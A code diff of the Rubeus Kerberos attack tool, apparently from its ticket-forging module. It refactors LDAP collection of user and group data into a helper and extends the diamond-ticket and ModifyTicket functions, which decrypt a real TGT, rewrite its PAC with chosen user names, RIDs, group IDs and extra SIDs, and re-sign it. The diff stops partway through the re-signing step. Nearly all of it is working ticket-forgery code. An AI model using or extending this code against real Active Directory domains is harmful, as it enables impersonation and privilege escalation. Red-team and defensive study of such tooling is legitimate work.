@@ -9,6 +9,11 @@ using System.Text.RegularExpressions;
 using Rubeus.lib.Interop;
 using Rubeus.Kerberos.PAC;
 using Rubeus.Kerberos;
+using System.DirectoryServices.Protocols;
+using static Rubeus.Interop;
+using System.DirectoryServices.ActiveDirectory;
+using System.Security.Cryptography;
+using System.Xml.Linq;
 
 namespace Rubeus
 {
@@ -151,7 +156,6 @@ namespace Rubeus
                 }
             }
 
-
             // determine domain if not supplied
             string[] parts = sname.Split('/');
             if (String.IsNullOrEmpty(domain))
@@ -190,350 +194,18 @@ namespace Rubeus
                 kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpperInvariant());
             }
 
-            // if /ldap was passed make the LDAP queries
             if (ldap)
             {
-                // try LDAPS and fail back to LDAP
-                List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
-                bool ssl = true;
-                if (String.IsNullOrEmpty(domainController))
-                {
-                    domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
-                }
-
-                Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
-                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
-                if (ActiveDirectoryObjects == null)
-                {
-                    Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
-                    ssl = false;
-                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
-                }
-                if (ActiveDirectoryObjects == null)
-                {
-                    Console.WriteLine("[X] Error LDAP query failed, unable to create ticket using LDAP.");
-                    return;
-                }
-
-                foreach (var userObject in ActiveDirectoryObjects)
-                {
-                    string objectSid = (string)userObject["objectsid"];
-                    string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
-
-                    // parse the UAC field and set in the PAC
-                    if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
-                    {
-                        kvi.UserAccountControl = 0;
-                        Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
-                        if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
-                        }
-
-                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
-                        }
-                        // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
-                        if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
-                        }
-                        /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
-                        if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
-                        }*/
-                    }
-
-                    if (userObject.ContainsKey("userprincipalname") && !String.IsNullOrWhiteSpace((string)userObject["userprincipalname"]))
-                    {
-                        upnFlags = 0;
-                    }
-
-                    List<IDictionary<string, Object>> adObjects = null;
-
-                    // build group and domain policy filter
-                    string filter = "";
-                    string outputText = "";
-                    if (string.IsNullOrEmpty(groups))
-                    {
-                        if (userObject.ContainsKey("memberof"))
-                        {
-                            foreach (string groupDN in (string[])userObject["memberof"])
-                            {
-                                filter += String.Format("(distinguishedname={0})", groupDN);
-                            }
-                            outputText += "group";
-                        }
-                    }
-
-                    if (pGid == null)
-                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
-
-                    if (minPassAge == null || (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
-                    {
-                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
-                        if (String.IsNullOrEmpty(outputText))
-                        {
-                            outputText = "domain policy";
-                        }
-                        else
-                        {
-                            outputText = String.Format("{0} and domain policy", outputText);
-                        }
-                    }
-
-                    if (!String.IsNullOrEmpty(filter))
-                    {
-                        // Try to get group and domain policy information from LDAP
-                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);
-                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
-                        if (adObjects == null)
-                        {
-                            Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
-                        }
-                        else
-                        {
-                            if (userObject.ContainsKey("memberof"))
-                            {
-                                kvi.GroupCount = ((string[])userObject["memberof"]).Length + 1;
-                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject["memberof"]).Length + 1];
-                            }
-                            else
-                            {
-                                kvi.GroupCount = 1;
-                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];
-                            }
-                            c = 0;
-                            foreach (var o in adObjects)
-                            {
-                                if (o.ContainsKey("gpcfilesyspath"))
-                                {
-                                    string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
-                                    gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
-                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);
-
-                                    if (gptTmplObject == null)
-                                    {
-                                        Console.WriteLine("[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.");
-                                        continue;
-                                    }
-
-                                    if (minPassAge == null)
-                                    {
-                                        minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);
-                                        if (minPassAge > 0)
-                                        {
-                                            kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)minPassAge));
-                                        }
-                                    }
-                                    if (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
-                                    {
-                                        maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
-                                        if (maxPassAge > 0)
-                                        {
-                                            DateTime pwdLastReset = (DateTime)userObject["pwdlastset"];
-                                            if (pwdLastReset == DateTime.MinValue)
-                                            {
-                                                DateTime dt = DateTime.Now;
-                                                pwdLastReset = dt.AddDays(-2);
-                                            }
-                                            kvi.PasswordMustChange = new Ndr._FILETIME((pwdLastReset.AddDays((double)maxPassAge)));
-                                        }
-                                    }
-                                }
-                                else
-                                {
-                                    string groupSid = (string)o["objectsid"];
-                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
-                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
-                                    c += 1;
-                                }
-                            }
-                        }
-                    }
-
-                    // preform the netbios name lookup
-                    if (String.IsNullOrEmpty(netbiosName))
-                    {
-                        Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);
-
-                        // first get forest root
-                        string forestRoot = null;
-                        try
-                        {
-                            forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;
-                        }
-                        catch
-                        {
-                            Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);
-                            forestRoot = domain;
-                        }
-
-                        string configRootDomain = domain;
-                        if (!domain.Equals(forestRoot))
-                            configRootDomain = forestRoot;
-
-                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));
-
-                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
-                        if (adObjects == null)
-                        {
-                            Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
-                        }
-                        else
-                        {
-                            foreach (var o in adObjects)
-                            {
-                                if (o.ContainsKey("netbiosname"))
-                                {
-                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o["netbiosname"]);
-                                }
-                            }
-                        }
-                    }
-
-                    // set the rest of the PAC fields
-                    if (userObject.ContainsKey("displayname"))
-                    {
-                        kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);
-                    }
-
-                    if (String.IsNullOrEmpty(sid))
-                    {
-                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
-                    }
-                    if (userObject.ContainsKey("logoncount"))
-                    {
-                        try
-                        {
-                            kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
-                        }
-                        catch
-                        {
-                            kvi.LogonCount = 0;
-                        }
-                    }
-                    if (userObject.ContainsKey("badpwdcount"))
-                    {
-                        try
-                        {
-                            kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
-                        }
-                        catch
-                        {
-                            kvi.BadPasswordCount = 0;
-                        }
-                        
-                    }
-                    if (userObject.ContainsKey("lastlogon") && ((DateTime)userObject["lastlogon"] != DateTime.MinValue))
-                    {
-                        kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
-                    }
-
-                    if (userObject.ContainsKey("lastlogoff") && ((DateTime)userObject["lastlogoff"] != DateTime.MinValue))
-                    {
-                        kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
-                    }
-                    if (userObject.ContainsKey("pwdlastset") && (DateTime)userObject["pwdlastset"] != DateTime.MinValue)
-                    {
-                        kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);
-                    }
-                    kvi.PrimaryGroupId = Int32.Parse((string)userObject["primarygroupid"]);
-                    kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-') + 1));
-                    if (userObject.ContainsKey("homedirectory"))
-                    {
-                        kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject["homedirectory"]);
-                    }
-                    if (userObject.ContainsKey("homedrive"))
-                    {
-                        kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject["homedrive"]);
-                    }
-                    if (userObject.ContainsKey("profilepath"))
-                    {
-                        kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject["profilepath"]);
-                    }
-                    if (userObject.ContainsKey("scriptpath"))
-                    {
-                        kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject["scriptpath"]);
-                    }
-
-                }
-
+                Ndr._KERB_VALIDATION_INFO? tempkvi = LDAPCollection(
+                                     user,
+                                     ldapuser,
+                                     ldappassword,
+                                     domainController,
+                                     domain);
+                if (tempkvi == null) return;
+                kvi = (Ndr._KERB_VALIDATION_INFO)tempkvi;
             }
+            
             else if (String.IsNullOrEmpty(sid))
             {
                 Console.WriteLine("[X] To forge tickets without specifying '/ldap', '/sid' is required.");
@@ -1227,21 +899,21 @@ namespace Rubeus
             }
         }
 
-        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
         {
-            byte[] tgtBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, luid, false, true);
-            
-            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
+            byte[] tgtBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, luid, false, opsec);
+
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
         }
 
-        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
         {
             byte[] tgtBytes = Ask.TGT(userName, domain, certFile, certPass, etype, null, false, domainController);
-            
-            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
+
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
         }
 
-        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey, string krbKey = "", string outfile = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey = "", string krbKey = "", string outfile = "", bool ldap = false, string ldapuser = "", string ldappassword = "", string domainController = "", string domain = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "",byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
         {
             Console.WriteLine();
             if (String.IsNullOrEmpty(krbKey))
@@ -1249,204 +921,237 @@ namespace Rubeus
                 krbKey = serviceKey;
             }
 
-            EncTicketPart decryptedEncTicket = null;
-            PACTYPE pt = null;
-            Ticket ticket = null;
-            try
+            if (sessionKey != null)
             {
-                ticket = kirbi.tickets[0];
-                Console.WriteLine("[*] Decrypting TGT");
-                decryptedEncTicket = ticket.Decrypt(Helpers.StringToByteArray(serviceKey), null);
-                Console.WriteLine("[*] Retreiving PAC");
-                pt = decryptedEncTicket.GetPac(null);
+                kirbi.enc_part.ticket_info[0].key = new EncryptionKey();
+                kirbi.enc_part.ticket_info[0].key.keyvalue = sessionKey;
+                kirbi.enc_part.ticket_info[0].key.keytype = (int)sessionKeyEtype;
             }
-            catch
+            if (!string.IsNullOrWhiteSpace(serviceKey))
             {
-                Console.WriteLine("[X] Unable to decrypt ticket or get PAC!");
-                return null;
-            }
-
-            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
-            ClientName cn = null;
-            UpnDns upnDns = null;
-            Attributes attrib = null;
-            Requestor requestor = null;
-            SignatureData svrSigData = null;
-            SignatureData kdcSigData = null;
-
-            Console.WriteLine("[*] Modifying PAC");
-            foreach (var pacInfoBuffer in pt.PacInfoBuffers)
-            {
-                if (pacInfoBuffer is LogonInfo linfo)
+                EncTicketPart decryptedEncTicket = null;
+                PACTYPE pt = null;
+                Ticket ticket = null;
+                try
                 {
-                    kvi = linfo.KerbValidationInfo;
-
-                    if (!String.IsNullOrEmpty(ticketUser))
-                    {
-                        kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(ticketUser);
-                    }
-
-                    if (!String.IsNullOrEmpty(groups))
-                    {
-                        int groupCount = groups.Split(',').Length;
-                        kvi.GroupCount = groupCount;
-                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[groupCount];
-
-                        int c = 0;
-                        foreach (string gid in groups.Split(','))
-                        {
-                            Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
-                            c += 1;
-                        }
-                    }
-                    if (ticketUserId > 0)
-                    {
-                        kvi.UserId = ticketUserId;
-                    }
-
-                    if (!String.IsNullOrEmpty(sids))
-                    {
-                        int numOfSids = sids.Split(',').Length;
-                        kvi.SidCount = numOfSids;
-                        kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
-                        int c = 0;
-                        foreach (string s in sids.Split(','))
-                        {
-                            Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
-                            c += 1;
-                        }
-                    }
+                    ticket = kirbi.tickets[0];
+                    Console.WriteLine("[*] Decrypting TGT");
+                    decryptedEncTicket = ticket.Decrypt(Helpers.StringToByteArray(serviceKey), null);
+                    Console.WriteLine("[*] Retreiving PAC");
+                    pt = decryptedEncTicket.GetPac(null);
                 }
-                else if (pacInfoBuffer is ClientName temp)
+                catch
                 {
-                    cn = temp;
-                    if (!String.IsNullOrEmpty(ticketUser))
-                    {
-                        cn = new ClientName(cn.ClientId,ticketUser);
-                    }
+                    Console.WriteLine("[X] Unable to decrypt ticket or get PAC!");
+                    return null;
                 }
-                else if (pacInfoBuffer is UpnDns temp2)
+
+                var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
+                ClientName cn = null;
+                UpnDns upnDns = null;
+                Attributes attrib = null;
+                Requestor requestor = null;
+                SignatureData svrSigData = null;
+                SignatureData kdcSigData = null;
+
+                if (ldap)
                 {
-                    upnDns = temp2;
-                    if (!String.IsNullOrEmpty(ticketUser))
+                    Ndr._KERB_VALIDATION_INFO? tempkvi = LDAPCollection(
+                                        ticketUser,
+                                        ldapuser,
+                                        ldappassword,
+                                        domainController,
+                                        ticket.realm);
+                    if (tempkvi == null)
                     {
-                        string samName = null;
-                        SecurityIdentifier sid = null;
-                        if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
+                        return null;
+                    }
+                    kvi = (Ndr._KERB_VALIDATION_INFO)tempkvi;
+                }
+
+                Console.WriteLine("[*] Modifying PAC");
+                foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+                {
+                    if (pacInfoBuffer is LogonInfo linfo)
+                    {
+                        if (!ldap) 
+                            kvi = linfo.KerbValidationInfo;
+
+                        if (!String.IsNullOrEmpty(ticketUser))
                         {
-                            samName = upnDns.SamName;
-                            if (!string.IsNullOrWhiteSpace(ticketUser))
+                            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(ticketUser);
+                        }
+
+                        if (!String.IsNullOrEmpty(groups))
+                        {
+                            int groupCount = groups.Split(',').Length;
+                            kvi.GroupCount = groupCount;
+                            kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[groupCount];
+
+                            int c = 0;
+                            foreach (string gid in groups.Split(','))
                             {
-                                samName = ticketUser;
-                            }
-                            sid = upnDns.Sid;
-                            if (ticketUserId > 0)
-                            {
-                                sid = new SecurityIdentifier(String.Format("{0}-{1}", sid.Value.Substring(0, sid.Value.LastIndexOf('-')), ticketUserId));
+                                Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
+                                c += 1;
                             }
                         }
-                        upnDns = new UpnDns((int)upnDns.Flags,upnDns.DnsDomainName,string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLowerInvariant()), samName, sid);
+                        if (ticketUserId > 0)
+                        {
+                            kvi.UserId = ticketUserId;
+                        }
 
+                        if (!String.IsNullOrEmpty(sids))
+                        {
+                            int numOfSids = sids.Split(',').Length;
+                            kvi.SidCount = numOfSids;
+                            kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
+                            int c = 0;
+                            foreach (string s in sids.Split(','))
+                            {
+                                Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
+                                c += 1;
+                            }
+                        }
                     }
-                }
-                else if (pacInfoBuffer is Attributes temp3)
-                {
-                    attrib = temp3;
-                }
-                else if (pacInfoBuffer is Requestor temp4)
-                {
-                    requestor = temp4;
-                    if (ticketUserId > 0)
+                    else if (pacInfoBuffer is ClientName temp)
                     {
-                        requestor = new Requestor(String.Format("{0}-{1}", requestor.RequestorSID.Value.Substring(0,requestor.RequestorSID.Value.LastIndexOf('-')), ticketUserId));
+                        cn = temp;
+                        if (!String.IsNullOrEmpty(ticketUser))
+                        {
+                            cn = new ClientName(cn.ClientId, ticketUser);
+                        }
+                    }
+                    else if (pacInfoBuffer is UpnDns temp2)
+                    {
+                        upnDns = temp2;
+                        if (!String.IsNullOrEmpty(ticketUser))
+                        {
+                            string samName = null;
+                            SecurityIdentifier sid = null;
+                            if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
+                            {
+                                samName = upnDns.SamName;
+                                if (!string.IsNullOrWhiteSpace(ticketUser))
+                                {
+                                    samName = ticketUser;
+                                }
+                                sid = upnDns.Sid;
+                                if (ticketUserId > 0)
+                                {
+                                    sid = new SecurityIdentifier(String.Format("{0}-{1}", kvi.LogonDomainId.GetValue(), ticketUserId));
+                                }
+                                else
+                                {
+                                   sid = new SecurityIdentifier(String.Format("{0}-{1}", kvi.LogonDomainId.GetValue(), kvi.UserId));
+                                }
+                            }
+                            upnDns = new UpnDns((int)upnDns.Flags, upnDns.DnsDomainName, string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLowerInvariant()), samName, sid);
+
+                        }
+                    }
+                    else if (pacInfoBuffer is Attributes temp3)
+                    {
+                        attrib = temp3;
+                    }
+                    else if (pacInfoBuffer is Requestor temp4)
+                    {
+                        requestor = temp4;
+                        if (ticketUserId > 0)
+                        {
+                            requestor = new Requestor(String.Format("{0}-{1}", kvi.LogonDomainId.GetValue(), ticketUserId));
+                        }
+                        else
+                        {
+                            requestor = new Requestor(String.Format("{0}-{1}", kvi.LogonDomainId.GetValue(), kvi.UserId));
+                        }
+                    }
+                    else if (pacInfoBuffer is SignatureData sigData)
+                    {
+                        if (sigData.Type == PacInfoBufferType.KDCChecksum)
+                        {
+                            kdcSigData = sigData;
+                        }
+                        else if (sigData.Type == PacInfoBufferType.ServerChecksum)
+                        {
+                            svrSigData = sigData;
+                        }
                     }
                 }
-                else if (pacInfoBuffer is SignatureData sigData)
+                int svrSigLength = 12;
+                int kdcSigLength = 12;
+                if (svrSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
+                    svrSigLength = 16;
+                if (kdcSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
+                    kdcSigLength = 16;
+                Console.WriteLine("[*] Signing PAC");
+                svrSigData.Signature = new byte[svrSigLength];
+                kdcSigData.Signature = new byte[kdcSigLength];
+                Array.Clear(svrSigData.Signature, 0, svrSigLength);
+                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
+
+                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
+                LogonInfo li = new LogonInfo(kvi);
+                PacInfoBuffers.Add(li);
+                if (cn != null)
                 {
-                    if (sigData.Type == PacInfoBufferType.KDCChecksum)
-                    {
-                        kdcSigData = sigData;
-                    }
-                    else if(sigData.Type == PacInfoBufferType.ServerChecksum)
-                    {
-                        svrSigData = sigData;
-                    }
+                    PacInfoBuffers.Add(cn);
                 }
-            }
-            int svrSigLength = 12;
-            int kdcSigLength = 12;
-            if (svrSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
-                svrSigLength = 16;
-            if (kdcSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
-                kdcSigLength = 16;
-            Console.WriteLine("[*] Signing PAC");
-            svrSigData.Signature = new byte[svrSigLength];
-            kdcSigData.Signature = new byte[kdcSigLength];
-            Array.Clear(svrSigData.Signature, 0, svrSigLength);
-            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
+                if (upnDns != null)
+                {
+                    PacInfoBuffers.Add(upnDns);
+                }
+                if (attrib != null)
+                {
+                    PacInfoBuffers.Add(attrib);
+                }
+                if (requestor != null)
+                {
+                    PacInfoBuffers.Add(requestor);
+                }
+                PacInfoBuffers.Add(svrSigData);
+                PacInfoBuffers.Add(kdcSigData);
+                PACTYPE newPT = new PACTYPE(0, PacInfoBuffers);
+                byte[] ptBytes = newPT.Encode();
+                byte[] svrSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
